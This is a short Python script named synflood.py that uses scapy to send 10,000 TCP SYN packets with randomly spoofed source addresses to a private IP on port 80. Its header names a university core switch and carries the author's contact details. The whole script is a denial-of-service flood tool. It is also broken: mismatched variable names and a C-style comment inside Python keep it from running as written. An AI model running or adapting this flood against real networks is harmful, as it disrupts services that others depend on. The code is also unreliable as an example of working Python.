'''
 * Program Name: synflood.py
 * Subject: "tsh core switch (172.18.18.200, 172.18.18.201)".
 * Input: "____".
 * Output: "____".
 * Since 2022/01/06
 * ___/__/__, add more comment
 * ToolKit: Atom 1.58.0, Python 3.9.9
 * Author: Finley
 *         Computer Center, Tatung University
'''

from scapy.all import *
import random

def synFlood():
    for i in range(10000):
        #建構隨機的來源ip
        src = '%i.%i.%i.%i'%(
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255),
            random.randint(1, 255)
        )
        #建構隨機的端口
        soprt = random.randint(1024, 65535)
        IPlayer = IP(src=src, dst='192.168.16.1')
        ICPlayer = TCP(sport=sport, dport=80, flags="S")
        packet = IPlayer/TCPlayer
        send(packet)

if __name__ == '__main__':
    /*add printf show input data*/
    print("  __ _       _                _____             _     _ \n");
    print(" / _(_)_ __ | | ___ _   _    |  ___|_ _ _ __   | |   (_)\n");
    print("| |_| |  _  | |/ _   | | |   | |_ / _  |  _  | | |   | |\n");
    print("|  _| | | | | |  __/ |_| |_  |  _| (_| | | | | | |___| |\n");
    print("|_| |_|_| |_|_||___|___  ( ) |_|  |__ _|_| |_| |_____|_|\n");
    print("                    |___/|/\n");
    print("********************************************************\n");
    print("* E-mail_fnali@gm.ttu.edu.tw, finley@ms.tsh.ttu.edu.tw *\n");
    print("* Website_https://finleyli.medium.com/                 *\n");
    print("********************************************************\n");
    synFlood()
